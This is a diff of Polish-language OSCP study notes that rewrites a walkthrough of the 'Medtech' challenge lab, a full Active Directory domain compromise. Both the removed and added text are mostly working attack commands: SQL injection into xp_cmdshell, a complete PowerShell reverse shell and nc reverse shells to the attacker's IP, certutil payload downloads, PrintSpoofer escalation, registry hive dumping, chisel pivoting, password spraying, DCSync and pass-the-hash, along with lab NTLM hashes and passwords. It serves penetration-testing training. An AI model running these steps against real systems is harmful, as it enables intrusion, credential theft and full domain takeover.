@@ -3150,355 +3150,135 @@ cat proof.txt                       # / type proof.txt
 
 ---
 
-# Appendix C — Medtech (Challenge Lab — pełny walkthrough step-by-step)
+# Appendix C — Medtech Challenge Lab (walkthrough, styl kursowy)
 
-> Zapis KROK PO KROKU realnego przejścia laba (10 hostów, 2 podsieci, DMZ → pivot → cała domena `medtech.com`).
-> Każdy krok: **dokładna komenda → co zwróciła → co to znaczy → co robię dalej**. Ze ślepymi zaułkami, żeby było widać *dlaczego* kolejny ruch.
-> `<KALI>` = Twój tun0 (`192.168.45.192` w tym przebiegu). Wartości flag zredagowane (`<proof>`) — to publiczna strona; surowe flagi w lokalnym `loot/`.
+> Duży łańcuch: brzegowy web (SQLi) → pivot → cała domena `medtech.com`. Pisane prosto — jedna komenda = jeden krok, z wyjaśnieniem. Wartości flag zredagowane (`<proof>`) — to publiczna strona. `<KALI>` = Twój tun0.
+> Hosty: WEB02 `192.168.224.121` (wejście, dual-homed do `172.16.224.254`), FILES02 `172.16.224.11`, DC01 `172.16.224.10`.
 
-## Mapa sieci (ustalona w trakcie)
-
-| IP | Host | Podsieć | Rola | Dostęp |
-|----|------|---------|------|--------|
-| 192.168.224.120 | (PAW) | DMZ | statyczny Jekyll — ślepy zaułek | wprost (VPN) |
-| **192.168.224.121** | **WEB02** | DMZ + `172.16.224.254` | IIS/ASP.NET, **wejście (SQLi)**, dual-homed | wprost (VPN) |
-| 192.168.224.122 | — | DMZ | OpenVPN gateway | wprost (VPN) |
-| **172.16.224.10** | **DC01** | internal | kontroler domeny | przez pivot |
-| 172.16.224.11 | FILES02 | internal | file server | przez pivot |
-| 172.16.224.12 | DEV04 | internal | serwer | przez pivot |
-| 172.16.224.13 | PROD01 | internal | serwer | przez pivot |
-| 172.16.224.82 | CLIENT01 | internal | Win11 (yoshi=admin) | przez pivot |
-| 172.16.224.83 | CLIENT02 | internal | Win11 | przez pivot |
-
----
-
-## KROK 0 — Setup i sprawdzenie tras
+## C.1 Rozpoznanie
 ```bash
-export KALI=192.168.45.192          # Twój tun0 (sprawdź: ip addr show tun0)
-mkdir -p ~/Offsec/Medtech/{scans,loot,www}; cd ~/Offsec/Medtech
-ip route
+nmap -sV -p- --min-rate 2000 192.168.224.121
 ```
-Istotne dwie linie z `ip route`:
-```
-192.168.224.0/24 via 192.168.45.254 dev tun0    # DMZ — osiągalne WPROST
-# 172.16.224.0/24 — BRAK wpisu                   # sieć wewnętrzna AD, tylko przez pivot
-```
-**Wniosek:** najpierw DMZ `192.168.224.120-122`. Do `172.16.224.x` wejdę dopiero po przejęciu hosta dual-homed i postawieniu tunelu.
-> ⚠️ Jeśli `sudo` prosi o hasło → skanuj `-sT` (TCP connect, bez roota). Dla SYN/UDP: `sudo -v` najpierw.
+WEB02 = IIS/ASP.NET (strona „MedTech") + SMB + WinRM. Sieć wewnętrzna `172.16.224.0/24` — dojdziemy przez pivot.
 
-## KROK 1 — Skan portów DMZ
+## C.2 WEB02 — SQL Injection na login.aspx
+Strona logowania to ASP.NET WebForms. Ważne: przy każdym POST musisz wysłać świeże pola `__VIEWSTATE`, `__VIEWSTATEGENERATOR`, `__EVENTVALIDATION` (pobierz je GET-em tuż przed). Najprościej użyć **Burp Repeater** (albo sqlmap z zapisanego requestu).
 ```bash
-for h in 120 121 122; do
-  nmap -p- --min-rate 3000 -Pn -sT -oN scans/$h-allports.txt 192.168.224.$h
-done
-nmap -sVC -Pn -p80,135,139,445,5985,5986 -oN scans/121-services.txt 192.168.224.121
-whatweb -a3 http://192.168.224.121/
+# potwierdzenie iniekcji - w polu username wpisz payload psujący składnię (błąd MSSQL wyjdzie na stronie):
+#   ' OR 1=1#          -> "Incorrect syntax near '#'" = Microsoft SQL Server
+# potwierdź, że iniekcja wykonuje osobne polecenia (stacked) opóźnieniem czasowym:
+#   ';WAITFOR DELAY '0:0:5'-- -                                  (odpowiedź po ~5s)
+#   ';IF IS_SRVROLEMEMBER('sysadmin')=1 WAITFOR DELAY '0:0:5'-- - (5s = jesteśmy sysadmin)
 ```
-Co wyszło:
-- **`.120`** — 22, 80 (Ruby/WEBrick, statyczny Jekyll „PAW!") → **ślepy zaułek**, odpuszczam.
-- **`.121`** — 80 (**IIS 10 / ASP.NET, tytuł „MedTech"**), 445 (SMB), 5985/5986 (WinRM) → **WEB02, cel wejścia**.
-- **`.122`** — 22, 1194 (OpenVPN) → na później.
-
-## KROK 2 — Enumeracja WEB02, znalezienie punktu wejścia
+Alternatywnie automatem (zapisz request z Burpa do pliku `login.req`):
 ```bash
-curl -s http://192.168.224.121/ | grep -oE 'href="[a-z_]+\.aspx"' | sort -u
-#   default/about/services/blog/contact/login .aspx
-curl -s http://192.168.224.121/login.aspx | grep -oiE 'UsernameTextBox|PasswordTextBox'
-```
-`login.aspx` ma pola `UsernameTextBox`/`PasswordTextBox` → **kandydat na SQLi (auth-bypass)**. Reszta statyczna.
-
-## KROK 3 — Skrypt do wstrzykiwania (KLUCZOWE dla ASP.NET WebForms)
-> **Pułapka:** WebForms odrzuca każdy POST bez świeżych `__VIEWSTATE`/`__VIEWSTATEGENERATOR`/`__EVENTVALIDATION` (HTTP 500 „viewstate MAC"). Pobieram je GET-em tuż przed każdym POST-em — stąd skrypt:
-```bash
-cat > inject.sh <<'SH'
-#!/bin/bash
-# Uzycie: ./inject.sh "PAYLOAD_W_POLU_USERNAME"
-IP=192.168.224.121
-URL="http://$IP/login.aspx"
-page=$(curl -s --max-time 10 "$URL")
-vs=$(echo "$page" | grep -oP 'id="__VIEWSTATE" value="\K[^"]+')
-vg=$(echo "$page" | grep -oP 'id="__VIEWSTATEGENERATOR" value="\K[^"]+')
-ev=$(echo "$page" | grep -oP 'id="__EVENTVALIDATION" value="\K[^"]+')
-curl -s -o /tmp/resp.html -w "czas=%{time_total}s rozmiar=%{size_download}B kod=%{http_code}\n" "$URL" \
-  --data-urlencode "__VIEWSTATE=$vs" \
-  --data-urlencode "__VIEWSTATEGENERATOR=$vg" \
-  --data-urlencode "__EVENTVALIDATION=$ev" \
-  --data-urlencode 'ctl00$ContentPlaceHolder1$UsernameTextBox='"$1" \
-  --data-urlencode 'ctl00$ContentPlaceHolder1$PasswordTextBox=x' \
-  --data-urlencode 'ctl00$ContentPlaceHolder1$LoginButton=Login'
-SH
-chmod +x inject.sh
+sqlmap -r login.req --batch --dbms=mssql --technique=T          # potwierdź; potem --os-shell dla RCE
 ```
 
-## KROK 4 — Potwierdzenie SQLi (przez ślepe zaułki)
-Najpierw co **NIE zadziałało od razu**:
+## C.3 WEB02 — z SQLi do RCE (xp_cmdshell) i shell
 ```bash
-./inject.sh "' OR 1=1-- -"     # rozmiar identyczny z baseline (~4082B), zero zmiany
-./inject.sh "'"                # to samo, brak komunikatu na stronie
+# w polu username, jako sysadmin, włącz xp_cmdshell (każdy payload to osobny POST ze świeżym viewstate):
+#   ';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;-- -
+# test wykonania - ping do siebie i podsłuch:
+sudo tcpdump -i tun0 icmp
+#   ';EXEC master..xp_cmdshell 'ping <KALI>'-- -
 ```
-Odpowiedzi bajt-w-bajt jak zwykły GET → wyglądało na brak iniekcji. **Powody:** (a) błędy SQL łapane, niewidoczne w treści, (b) tabela userów pusta, więc `OR 1=1` nic nie zwraca. Rozwiązanie — wymusić **błąd** znakiem psującym składnię MSSQL:
+Reverse shell (PowerShell, metoda z kursu):
 ```bash
-./inject.sh "' OR 1=1#"
-grep -io "System.Data.SqlClient.SqlException\|Incorrect syntax near '#'\|Unclosed quotation" /tmp/resp.html
+nc -lvnp 443                                                     # listener na Kali
+# wygeneruj payload base64 (przykład z modułu; podmień IP/port), potem:
+#   ';EXEC master..xp_cmdshell 'powershell -e <BASE64>'-- -
 ```
-Rozmiar skoczył do **8835B** (wyrenderował się stack trace):
-```
-Incorrect syntax near '#'
-System.Data.SqlClient.SqlException
-Unclosed quotation
-```
-> 💎 Silnik = **Microsoft SQL Server**, `customErrors` OFF (widać wyjątek). MSSQL ⇒ mam **stacked queries** i `xp_cmdshell`.
+Shell wraca jako konto usługi MSSQL. `type C:\inetpub\wwwroot\web.config` → connection string `sa`. `ipconfig` → WEB02 ma też `172.16.224.254` (most do domeny).
 
-## KROK 5 — SQLi → wykonanie kodu (stacked queries)
+## C.4 WEB02 — PrivEsc do SYSTEM (SeImpersonate)
 ```bash
-./inject.sh "';WAITFOR DELAY '0:0:5'-- -"          # czas=5.13s -> stacked DZIALA
-./inject.sh "';IF IS_SRVROLEMEMBER('sysadmin')=1 WAITFOR DELAY '0:0:5'-- -"   # czas=5.12s -> SYSADMIN
-# wlacz xp_cmdshell:
-./inject.sh "';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;-- -"
-# test RCE — ping do siebie (nasluchuj: sudo tcpdump -i tun0 icmp):
-./inject.sh "';EXEC master..xp_cmdshell 'ping -n 3 '$KALI'-- -"
-```
-ICMP przyszło na `tcpdump` → **RCE jako konto usługi MSSQL**.
-
-## KROK 6 — Reverse shell z WEB02
-```bash
-nc -lvnp 443     # Kali: listener
-PSRS='$c=New-Object System.Net.Sockets.TCPClient("'$KALI'",443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()'
-B64=$(echo -n "$PSRS" | iconv -t UTF-16LE | base64 -w0)     # -e wymaga UTF-16LE
-./inject.sh "';EXEC master..xp_cmdshell 'powershell -e $B64'-- -"
-```
-Shell jako `nt service\mssql$sqlexpress`. Rozeznanie:
-```powershell
-whoami /priv                          # SeImpersonatePrivilege = Enabled  (droga do SYSTEM)
-type C:\inetpub\wwwroot\web.config    # sa / WhileChirpTuesday218
-ipconfig                              # DWA adresy: 192.168.224.121 + 172.16.224.254 (dual-homed!)
+# w shellu: whoami /priv  -> SeImpersonatePrivilege = Enabled
+# hostuj narzędzia na Kali:
+python3 -m http.server 8000        # w katalogu z PrintSpoofer64.exe i nc.exe
+# na WEB02 pobierz i uruchom:
+#   certutil -urlcache -split -f http://<KALI>:8000/PrintSpoofer64.exe C:\Windows\Temp\ps.exe
+#   certutil -urlcache -split -f http://<KALI>:8000/nc.exe C:\Windows\Temp\nc.exe
+# nowy listener: nc -lvnp 4445 na Kali, potem na WEB02:
+#   C:\Windows\Temp\ps.exe -c "C:\Windows\Temp\nc.exe <KALI> 4445 -e cmd.exe"     -> nt authority\system
+# flaga: type C:\Users\Administrator\Desktop\proof.txt   (= <proof>)
 ```
 
-## KROK 7 — PrivEsc do SYSTEM (SeImpersonate → PrintSpoofer)
+## C.5 WEB02 — zbierz creds (jako SYSTEM)
 ```bash
-cd ~/Offsec/Medtech/www; cp /usr/share/windows-resources/binaries/nc.exe .   # + PrintSpoofer64.exe
-python3 -m http.server 8000
-```
-Na WEB02:
-```powershell
-certutil -urlcache -split -f http://<KALI>:8000/PrintSpoofer64.exe C:\Windows\Temp\ps.exe
-certutil -urlcache -split -f http://<KALI>:8000/nc.exe C:\Windows\Temp\nc.exe
-# Kali: nc -lvnp 4445 ; potem na WEB02:
-C:\Windows\Temp\ps.exe -c "C:\Windows\Temp\nc.exe <KALI> 4445 -e cmd.exe"
-```
-`whoami` = **nt authority\system**.
-```cmd
-type C:\Users\Administrator\Desktop\proof.txt    :: <proof>
+# na WEB02 zrzuć hive'y rejestru:
+#   reg save HKLM\SAM C:\Windows\Temp\sam /y
+#   reg save HKLM\SYSTEM C:\Windows\Temp\system /y
+#   reg save HKLM\SECURITY C:\Windows\Temp\security /y
+# przenieś pliki na Kali (np. przez SMB) i wyciągnij:
+impacket-secretsdump -sam sam -system system -security security LOCAL
+#   -> plaintext DefaultPassword: Flowers1  + cached DCC2 dla joe
 ```
 
-## KROK 8 — Zbiór creds z WEB02 (jako SYSTEM)
-```cmd
-reg save HKLM\SAM      C:\Windows\Temp\sam.hive /y
-reg save HKLM\SYSTEM   C:\Windows\Temp\system.hive /y
-reg save HKLM\SECURITY C:\Windows\Temp\security.hive /y
-```
+## C.6 Pivot do sieci wewnętrznej (chisel)
 ```bash
-impacket-smbserver share ~/Offsec/Medtech/loot -smb2support -user kali -pass Kali123
-# WEB02:  net use \\<KALI>\share /user:kali Kali123  &&  copy C:\Windows\Temp\*.hive \\<KALI>\share\
-impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
-```
-> 💎 Z LSA: **`DefaultPassword : Flowers1`** + cached DCC2 dla `joe`. Para do sprayu: **`joe / Flowers1`**.
-
-## KROK 9 — Pivot do sieci wewnętrznej (chisel reverse SOCKS)
-```bash
-# Kali:
-cp $(which chisel) ~/Offsec/Medtech/www/ 2>/dev/null      # + chisel.exe do www/
-chisel server -p 8080 --reverse
-```
-Na WEB02:
-```cmd
-certutil -urlcache -split -f http://<KALI>:8000/chisel.exe C:\Windows\Temp\c.exe
-cmd /c start /b C:\Windows\Temp\c.exe client <KALI>:8080 R:socks
-```
-W logu servera: `session#1 ... R:127.0.0.1:1080:socks Listening`. Test (proxychains ma `socks5 127.0.0.1 1080`):
-```bash
-proxychains -q nc -zv -w3 172.16.224.11 5985     # internal osiagalny przez tunel
+chisel server -p 8080 --reverse            # na Kali
+# na WEB02: pobierz chisel.exe (certutil, jak wyżej) i odpal klienta:
+#   C:\Windows\Temp\chisel.exe client <KALI>:8080 R:socks
+# -> SOCKS 127.0.0.1:1080. Do wewnątrz: proxychains -q <narzędzie>
 ```
 
-## KROK 10 — Recon wewnątrz + spray joe/Flowers1
+## C.7 FILES02 — spray creds → shell + creds
 ```bash
-proxychains -q nxc smb 172.16.224.10-14,82,83 -u joe -p 'Flowers1' -d medtech.com
+# spray hasła po sieci wewnętrznej (nxc pokaże (Pwn3d!) gdzie konto jest adminem):
+proxychains -q nxc smb 172.16.224.0/24 -u joe -p 'Flowers1' -d medtech.com
+#   -> joe jest lokalnym adminem na FILES02
+proxychains -q evil-winrm -i 172.16.224.11 -u joe -p 'Flowers1'     # shell + flagi
+# zrzut creds zdalnie (joe = admin):
+proxychains -q impacket-secretsdump 'medtech.com/joe:Flowers1@172.16.224.11'
+#   -> cached DCC2 dla yoshi, wario
 ```
-```
-172.16.224.10 DC01 (signing:True)   [+] joe:Flowers1
-172.16.224.11 FILES02               [+] joe:Flowers1 (Pwn3d!)     <- lokalny admin
-.12 DEV04  .13 PROD01  .82 CLIENT01  .83 CLIENT02
-```
-`joe:Flowers1` ważne w całej domenie; na **FILES02** joe = **admin**.
 
-## KROK 11 — FILES02: flagi + zrzut creds
+## C.8 Łamanie DCC2
 ```bash
-proxychains -q evil-winrm -i 172.16.224.11 -u joe -p 'Flowers1'
-#   type C:\Users\joe\Desktop\local.txt            -> <proof>
-#   type C:\Users\Administrator\Desktop\proof.txt   -> <proof>
-proxychains -q impacket-secretsdump 'medtech.com/joe:Flowers1@172.16.224.11' | tee loot/secretsdump-files02.txt
+# skopiuj hashe DCC2 do pliku dcc2.txt (format $DCC2$...), potem:
+hashcat -m 2100 dcc2.txt /usr/share/wordlists/rockyou.txt
+#   -> yoshi : Mushroom!   (i wario : Mushroom!)
 ```
-> 💎 SAM: lokalny `Administrator` NTLM `f1014ac49bae005ee3ece5f47547d185`. DCC2: **`yoshi`**, **`wario`** (konta domenowe) → do złamania.
 
-## KROK 12 — Łamanie DCC2 (yoshi, wario)
+## C.9 Droga do DC — konto w Backup Operators
 ```bash
-cat > loot/dcc2.hash <<'H'
-$DCC2$10240#yoshi#cd21be418f01f5591ac8df1fdeaa54b6
-$DCC2$10240#wario#b82706aff8acf56b6c325a6c2d8c338a
-H
-hashcat -m 2100 loot/dcc2.hash /usr/share/wordlists/rockyou.txt
-```
-> 💎 Złamane: **`yoshi : Mushroom!`**, **`wario : Mushroom!`**.
-
-## KROK 13 — Spray yoshi + pełna mapa domeny
-```bash
-proxychains -q nxc smb 172.16.224.10-14,82,83 -u yoshi -p 'Mushroom!' -d medtech.com
-```
-```
-.10 DC01 (signing:True)  .11 FILES02  .12 DEV04  .13 PROD01
-.82 CLIENT01 [+] yoshi:Mushroom! (Pwn3d!)   .83 CLIENT02
-```
-yoshi ważne wszędzie, **admin na CLIENT01**. Ale cel = DC01, gdzie yoshi nie jest adminem → szukam ścieżki do kontrolera.
-
-## KROK 14 — Enumeracja LDAP: kto jest uprzywilejowany
-```bash
+# enumeracja: kto jest uprzywilejowany (adminCount=1) i w jakich grupach:
 proxychains -q nxc ldap 172.16.224.10 -u yoshi -p 'Mushroom!' -d medtech.com --admin-count
-#   -> Administrator, krbtgt, leon, joe
-proxychains -q nxc ldap 172.16.224.10 -u yoshi -p 'Mushroom!' -d medtech.com --query "(sAMAccountName=joe)"  "memberOf"
-proxychains -q nxc ldap 172.16.224.10 -u yoshi -p 'Mushroom!' -d medtech.com --query "(sAMAccountName=leon)" "memberOf"
+proxychains -q nxc ldap 172.16.224.10 -u yoshi -p 'Mushroom!' -d medtech.com --query "(sAMAccountName=joe)" "memberOf"
+#   -> joe (którego mamy) jest w grupie "Backup Operators"
 ```
-**Przełom:**
-```
-joe  memberOf: CN=Backup Operators,CN=Builtin,DC=medtech,DC=com
-leon memberOf: CN=Domain Admins,CN=Users,DC=medtech,DC=com
-```
-> 💎 **`leon` = Domain Admin** (cel). **`joe` (mam: joe/Flowers1) ∈ `Backup Operators`** → `SeBackupPrivilege` = odczyt dowolnego pliku/klucza z pominięciem ACL. To droga na DC01 bez admina i bez WinRM.
-
-## KROK 15 — Ślepy zaułek (czego NIE próbować)
+`Backup Operators` = prawo czytania dowolnego pliku/rejestru (SeBackupPrivilege). Zrzuć rejestr DC:
 ```bash
-proxychains -q nxc winrm 172.16.224.10 -u joe -p 'Flowers1' -d medtech.com   # [-] joe NIE ma WinRM na DC
-```
-joe nie zaloguje się interaktywnie na DC → `evil-winrm`/`psexec` odpadają. Zostaje samo `SeBackupPrivilege`.
-
-## KROK 16 — Backup Operators → zrzut hive'ów DC01
-```bash
+# zapisz hive'y DC do NETLOGON (czytelne dla każdego usera, bo joe nie jest adminem i nie wejdzie na C$):
 proxychains -q impacket-reg medtech.com/joe:'Flowers1'@172.16.224.10 backup -o 'C:\Windows\SYSVOL\domain\scripts'
-```
-```
-[*] Saved HKLM\SAM      to C:\Windows\SYSVOL\domain\scripts\SAM.save
-[*] Saved HKLM\SYSTEM   to C:\Windows\SYSVOL\domain\scripts\SYSTEM.save
-[*] Saved HKLM\SECURITY to C:\Windows\SYSVOL\domain\scripts\SECURITY.save
-```
-> **Dlaczego `SYSVOL\domain\scripts` (=NETLOGON), a nie `C:\Windows\Temp`?** joe nie jest adminem → brak dostępu do `C$`. `reg backup` zapisuje jako SYSTEM, a **NETLOGON czytają wszyscy uwierzytelnieni** → zapisuję tam, gdzie odczytam jako joe.
-
-## KROK 17 — Pobranie hive'ów + hash konta DC01$
-```bash
+# pobierz je jako joe przez share NETLOGON:
 proxychains -q impacket-smbclient medtech.com/joe:'Flowers1'@172.16.224.10
 #   use NETLOGON ; get SAM.save ; get SYSTEM.save ; get SECURITY.save ; exit
+# wyciągnij hash konta maszyny DC:
 impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
+#   -> $MACHINE.ACC : <hash DC01$>
 ```
-```
-$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:a33541422e1a4b0215845adf08cd8169
-```
-> 💎 **Hash konta maszyny `DC01$`**. Konto komputera kontrolera **ma prawa replikacji** → mogę zrobić **DCSync**.
 
-## KROK 18 — DCSync: zrzut całej domeny
+## C.10 DCSync → cała domena → flaga na DC
 ```bash
-proxychains -q impacket-secretsdump -just-dc -hashes :a33541422e1a4b0215845adf08cd8169 'medtech.com/DC01$@172.16.224.10'
+# konto maszyny DC ma prawa replikacji -> DCSync:
+proxychains -q impacket-secretsdump -just-dc -hashes :<hash_DC01$> 'medtech.com/DC01$@172.16.224.10'
+#   -> Administrator NTLM, krbtgt, leon (Domain Admin)...
+# wejdź na DC domenowym Administratorem (Pass-the-Hash) i weź flagę:
+proxychains -q impacket-wmiexec -hashes :<hash_Administrator> medtech.com/Administrator@172.16.224.10
+#   type C:\Users\Administrator\Desktop\proof.txt   (= <proof>)
+# domenowy Administrator = admin wszędzie -> zbierz flagi z pozostałych hostów tym samym hashem.
 ```
-```
-Administrator:500:...:c33b5cf9fa1b1bb4894d4a6cd7c54034:::
-krbtgt:502:...:7e68841e296897d2343488c23265e8b8:::
-leon:1105:...:2e208ad146efda5bc44869025e06544a:::
-```
-> 💎 NTLM domenowego **Administratora** + **krbtgt** (golden ticket) + **leon (DA)**. Domena moja.
 
-## KROK 19 — Wejście na DC01 (Pass-the-Hash) + flaga
+## C.11 Sprzątanie (oceniane wg reguł)
 ```bash
-proxychains -q impacket-wmiexec -hashes :c33b5cf9fa1b1bb4894d4a6cd7c54034 medtech.com/Administrator@172.16.224.10
-#   whoami                                       -> medtech\administrator
-#   type C:\Users\Administrator\Desktop\proof.txt -> <proof>
+# usuń narzędzia i zrzuty które zostawiłeś, szczególnie z NETLOGON (widoczne dla całej domeny!):
+#   del C:\Windows\SYSVOL\domain\scripts\SAM.save ...\SYSTEM.save ...\SECURITY.save
+#   del C:\Windows\Temp\ps.exe C:\Windows\Temp\nc.exe C:\Windows\Temp\chisel.exe
+#   przywróć xp_cmdshell do stanu wyłączonego: ';EXEC sp_configure 'xp_cmdshell',0;RECONFIGURE;-- -
+# zamknij tunele/listenery na Kali.
 ```
-
-## KROK 20 — Flagi z reszty hostów (PtH tym samym hashem)
-```bash
-H=c33b5cf9fa1b1bb4894d4a6cd7c54034
-for ip in 172.16.224.12 172.16.224.13 172.16.224.83; do
-  proxychains -q impacket-wmiexec -hashes :$H medtech.com/Administrator@$ip \
-    "(for /r C:\Users %i in (proof.txt local.txt) do @type \"%i\" 2>nul)"
-done
-```
-DEV04 `<proof>` · PROD01 `<proof>` · CLIENT02 `<proof>`. **6 hostów zaliczone → pełne przejęcie domeny.**
-
-## KROK 21 — Cleanup (post-exploitation — OCENIANE wg rules)
-```bash
-Hadm=c33b5cf9fa1b1bb4894d4a6cd7c54034
-# 1) DC01 — skasuj hive'y z NETLOGON (były widoczne dla całej domeny!):
-proxychains -q impacket-wmiexec -hashes :$Hadm medtech.com/Administrator@172.16.224.10 \
-  "del /q C:\Windows\SYSVOL\domain\scripts\SAM.save C:\Windows\SYSVOL\domain\scripts\SYSTEM.save C:\Windows\SYSVOL\domain\scripts\SECURITY.save"
-# 2) WEB02 — ubij chisela, usuń narzędzia, PRZYWRÓĆ xp_cmdshell do OFF:
-proxychains -q impacket-wmiexec -hashes :$Hadm medtech.com/Administrator@192.168.224.121 \
-  "taskkill /f /im c.exe & del /q C:\Windows\Temp\c.exe C:\Windows\Temp\ps.exe C:\Windows\Temp\nc.exe C:\Windows\Temp\*.hive"
-./inject.sh "';EXEC sp_configure 'xp_cmdshell',0;RECONFIGURE;-- -"
-# 3) Kali — pozamykaj listenery i temp:
-pkill -f "chisel server"; pkill -f "http.server"; rm -f /tmp/resp.html
-```
-Checklist: [x] narzędzia usunięte [x] `xp_cmdshell` OFF [x] hive dumps skasowane (Temp **i NETLOGON**) [x] tunele zamknięte [x] sekrety tylko w `loot/` poza repo.
-
----
-
-## Log proof-flag (do raportu)
-
-| Host | IP | local.txt | proof.txt | metoda dostępu | privesc |
-|------|----|-----------|-----------|----------------|---------|
-| WEB02   | 192.168.224.121 | — | `<proof>` | SQLi `login.aspx` → `xp_cmdshell` → PS revshell | SeImpersonate → PrintSpoofer |
-| FILES02 | 172.16.224.11   | `<proof>` | `<proof>` | spray `joe:Flowers1` → WinRM | joe = lokalny admin |
-| CLIENT01 | 172.16.224.82  | (do zebrania) | (do zebrania) | spray `yoshi:Mushroom!` (Pwn3d!) | yoshi = lokalny admin |
-| **DC01** | 172.16.224.10  | — | `<proof>` | joe∈Backup Operators → reg-backup → DC01$ → DCSync → PtH | kontroler |
-| DEV04   | 172.16.224.12   | (do zebrania) | `<proof>` | PtH Administrator c33b… | domenowy admin |
-| PROD01  | 172.16.224.13   | — | `<proof>` | PtH Administrator c33b… | domenowy admin |
-| CLIENT02 | 172.16.224.83  | (do zebrania) | `<proof>` | PtH Administrator c33b… | domenowy admin |
-
-## Zebrane poświadczenia
-
-| Konto | Sekret | Źródło | Zastosowanie |
-|-------|--------|--------|--------------|
-| `sa` (MSSQL) | `WhileChirpTuesday218` | WEB02 `web.config` | lokalny MSSQL / reuse |
-| DefaultPassword | `Flowers1` | WEB02 LSA | **spray domenowy** (joe działa) |
-| `MEDTECH\joe` | `Flowers1` | spray | admin FILES02 + **Backup Operators** |
-| FILES02 `Administrator` | NTLM `f1014ac49bae005ee3ece5f47547d185` | FILES02 SAM | PtH |
-| `MEDTECH\yoshi` | `Mushroom!` (złamane DCC2) | FILES02 | admin CLIENT01, enum LDAP |
-| `MEDTECH\wario` | `Mushroom!` (złamane DCC2) | FILES02 | ruch w domenie |
-| `DC01$` (maszyna) | NTLM `a33541422e1a4b0215845adf08cd8169` | reg-backup DC01 | **DCSync** |
-| `MEDTECH\Administrator` | NTLM `c33b5cf9fa1b1bb4894d4a6cd7c54034` | DCSync | **admin wszędzie** |
-| `MEDTECH\krbtgt` | NTLM `7e68841e296897d2343488c23265e8b8` | DCSync | golden ticket |
-| `MEDTECH\leon` (DA) | NTLM `2e208ad146efda5bc44869025e06544a` | DCSync | Domain Admin |
-
-## Łańcuch (mapa myślowa)
-```
-WEB02 IIS/ASP.NET login.aspx
-  │ SQLi (viewstate + error '#' + stacked) -> xp_cmdshell -> reverse shell
-  │ SeImpersonate -> PrintSpoofer -> SYSTEM ; loot: Flowers1, dual-homed 172.16.224.254
-  ▼
-chisel reverse SOCKS (pivot do 172.16.224.0/24)
-  │ spray joe:Flowers1 -> FILES02 (admin) -> secretsdump -> DCC2 yoshi/wario -> "Mushroom!"
-  │ spray yoshi:Mushroom! -> CLIENT01 (admin) + mapa hostów
-  ▼
-LDAP: joe ∈ Backup Operators (mam joe!) , leon = Domain Admin
-  │ reg backup DC01 -> NETLOGON -> secretsdump -> hash DC01$
-  │ DCSync kontem DC01$ -> Administrator + krbtgt + leon
-  ▼
-PtH Administratorem -> DC01 + DEV04 + PROD01 + CLIENT02 = cała domena
-```
-
-## Wnioski „na podobny przypadek"
-- **ASP.NET „nie reaguje" ≠ brak SQLi.** Ogarnij viewstate; pustą tabelę userów obchodź przez **stacked/time-based**, nie `OR 1=1`; błąd wymuś znakiem `#`.
-- **Zawsze sprawdzaj `memberOf` zdobytych kont** — droga do DC bywa na „nieoczywistej" grupie: `Backup Operators`, `Server Operators`, `DnsAdmins`.
-- **Hash konta maszyny DC (`DC$`) = DCSync.** Nie potrzeba konta DA.
-- **NETLOGON/SYSVOL** = kanał odczytu jako nie-admin (SYSTEM zapisuje, każdy czyta) — pamiętaj **posprzątać**.
-
----
-
 # Appendix D — OSCP Challenge Lab A (walkthrough, styl kursowy)
 
 > 6 maszyn: 3 standalone (`.143`,`.144`,`.145`) + 3 w AD `oscp.exam` (MS01 `.141`, DC01 `10.10.224.140`, MS02 `10.10.224.142`). Assumed-breach do AD: `Eric.Wallows : EricLikesRunning800`. `<KALI>` = Twój tun0.
